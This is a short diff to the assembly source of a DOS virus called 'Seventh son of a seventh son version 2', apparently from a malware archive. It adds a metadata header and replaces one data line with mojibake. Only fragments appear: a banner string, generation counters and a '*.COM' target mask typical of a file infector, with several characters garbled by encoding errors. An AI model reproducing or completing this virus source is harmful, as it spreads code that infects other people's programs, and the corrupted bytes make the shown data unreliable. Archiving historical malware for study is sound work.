@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      0 9
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;****************************************************************************
 ;*              Seventh son of a seventh son    version 2
 ;****************************************************************************
@@ -222,7 +233,7 @@ sontxt          db      'Seventh son of a seventh son',0Dh, 0Ah, '$'
 grandfather     db      0
 father          db      0
 filename        db      '*.COM',0
-                db      '‚¨°³±'
+                db      'ï¿½ï¿½ï¿½ï¿½ï¿½'
 
 end:
 
